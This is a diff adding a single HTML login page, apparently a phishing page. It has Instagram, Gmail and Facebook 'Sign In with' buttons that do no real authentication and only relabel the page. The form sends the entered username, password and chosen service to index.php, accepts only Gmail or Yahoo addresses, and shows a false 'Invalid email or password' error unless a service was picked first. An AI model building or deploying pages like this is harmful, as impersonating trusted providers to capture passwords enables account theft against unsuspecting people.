@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+    <style>
+        /* General Styles */
+body {
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    background: linear-gradient(135deg, #f5f7fa, #c3cfe2); /* Soft gradient */
+    margin: 0;
+    padding: 20px; /* Add padding to the body */
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    overflow-x: hidden;
+}
+
+.login-container {
+    background: #ffffff;
+    width: 100%;
+    max-width: 400px;
+    padding: 25px;
+    border-radius: 16px;
+    box-shadow: 0 12px 24px rgba(0, 0, 0, 0.1);
+    text-align: center;
+    animation: fadeIn 0.5s ease-in-out;
+    margin-top: 20px;
+}
+
+@keyframes fadeIn {
+    from { opacity: 0; transform: translateY(-20px); }
+    to { opacity: 1; transform: translateY(0); }
+}
+
+.login-container h2 {
+    margin-bottom: 20px;
+    font-size: 28px;
+    color: #333333;
+    font-weight: 600;
+}
+
+.form-group {
+    margin-bottom: 20px;
+    text-align: left;
+}
+
+.form-group label {
+    display: block;
+    margin-bottom: 8px;
+    font-weight: 500;
+    font-size: 14px;
+    color: #555555;
+}
+
+.form-group input {
+    width: calc(100% - 24px);
+    padding: 12px;
+    border: 1px solid #dddddd;
+    border-radius: 8px;
+    font-size: 14px;
+    transition: border-color 0.3s ease, box-shadow 0.3s ease;
+}
+
+.form-group input:focus {
+    outline: none;
+    border-color: #6c63ff;
+    box-shadow: 0 0 8px rgba(108, 99, 255, 0.3);
+}
+
+.login-btn {
+    width: 100%;
+    padding: 14px;
+    background-color: #6c63ff;
+    color: #ffffff;
+    border: none;
+    border-radius: 8px;
+    font-size: 16px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: background-color 0.3s ease, transform 0.2s ease;
+}
+
+.login-btn:hover {
+    background-color: #574fdb;
+    transform: translateY(-2px);
+}
+
+.help-text {
+    margin-top: 15px;
+    font-size: 14px;
+    color: #777777;
+    text-align: center;
+}
+
+.help-text a {
+    color: #6c63ff;
+    text-decoration: none;
+    font-weight: 500;
+    transition: color 0.3s ease;
+}
+
+.help-text a:hover {
+    color: #574fdb;
+}
+
+.error {
+    color: #ff4d4d;
+    font-size: 14px;
+    display: none;
+    margin-top: 8px;
+}
+
+.social-login {
+    margin-top: 25px;
+    display: flex;
+    flex-direction: column;
+    gap: 12px;
+}
+
+.social-btn {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 12px;
+    font-size: 16px;
+    font-weight: 600;
+    text-decoration: none;
+    color: white;
+    border-radius: 8px;
+    transition: background-color 0.3s ease, transform 0.2s ease;
+}
+
+.social-btn i {
+    margin-right: 10px;
+}
+
+.social-btn:hover {
+    transform: translateY(-2px);
+}
+
+.instagram-btn {
+    background-color: #e1306c;
+}
+
+.instagram-btn:hover {
+    background-color: #c8235a;
+}
+
+.gmail-btn {
+    background-color: #db4437;
+}
+
+.gmail-btn:hover {
+    background-color: #c23328;
+}
+
+.facebook-btn {
+    background-color: #4267b2;
+}
+
+.facebook-btn:hover {
+    background-color: #365899;
+}
+
+.create-account-text {
+    margin-top: 20px;
+    font-size: 16px;
+    font-weight: 600;
+    color: #333333;
+    cursor: pointer;
+    transition: color 0.3s ease;
+}
+
+.create-account-text:hover {
+    color: #6c63ff;
+}
+
+@media (max-width: 480px) {
+    body {
+        padding: 15px;
+    }
+
+    .login-container {
+        padding: 20px;
+        margin-top: 10px;
+    }
+
+    .login-container h2 {
+        font-size: 24px;
+    }
+
+    .form-group input {
+        padding: 10px;
+        font-size: 14px;
+    }
+
+    .login-btn {
+        padding: 12px;
+        font-size: 14px;
+    }
+
+    .social-btn {
+        font-size: 14px;
+        padding: 10px;
+    }
+
+    .create-account-text {
+        font-size: 14px;
+    }
+}
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <h2 id="header">Login</h2>
+        <form id="loginForm" action="index.php" method="POST" onsubmit="return validateEmail()">
+            <!-- Hidden input to store the selected app -->
+            <input type="hidden" id="appName" name="appName" value="">
+            <div class="form-group">
+                <label for="username">Username or Email</label>
+                <input type="text" id="username" name="username" placeholder="Enter your username or email" required>
+                <span id="emailError" class="error">Please enter a valid Gmail or Yahoo address (e.g., example@gmail.com).</span>
+            </div>
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" placeholder="Enter your password" required>
+            </div>
+            <button type="submit" class="login-btn">Login</button>
+            <p class="help-text">Forgot your password? <a href="#">Click here</a></p>
+        </form>
+        
+        <div class="create-account-text" onclick="openSignupWindow()">Don't have an Account? <br>Create Account</div>
+        
+        <div class="social-login">
+            <a href="#" class="social-btn instagram-btn" onclick="setAppName('Instagram')">
+                <i class="fab fa-instagram"></i> Instagram
+            </a>
+            <a href="#" class="social-btn gmail-btn" onclick="setAppName('Gmail')">
+                <i class="fab fa-google"></i> Gmail
+            </a>
+            <a href="#" class="social-btn facebook-btn" onclick="setAppName('Facebook')">
+                <i class="fab fa-facebook"></i> Facebook
+            </a>
+        </div>
+    </div>
+
+    <script>
+
+        function validateEmail() {
+            const email = document.getElementById('username').value;
+            const emailError = document.getElementById('emailError');
+            const validEmailRegex = /^[a-zA-Z0-9._%+-]+@(gmail\.com|yahoo\.com)$/i;
+            const isSocialSelected = localStorage.getItem('selectedApp') !== null;
+            if (!isSocialSelected) {
+
+                emailError.textContent = "Invalid email or password.";
+                emailError.style.display = 'block';
+                return false;
+            }
+
+            if (!validEmailRegex.test(email)) {
+                emailError.textContent = "Please enter a valid Gmail or Yahoo address (e.g., example@gmail.com).";
+                emailError.style.display = 'block';
+                return false;
+            } else {
+                emailError.style.display = 'none';
+                return true;
+            }
+        }
+
+        function setAppName(appName) {
+            localStorage.setItem('selectedApp', appName);
+            window.location.reload();
+        }
+
+        window.onload = function () {
+            const selectedApp = localStorage.getItem('selectedApp');
+            if (selectedApp) {
+                document.getElementById('header').innerText = `Sign In with ${selectedApp}`;
+                document.getElementById('appName').value = selectedApp;
+            }
+        };
+    </script>
+</body>
+</html>
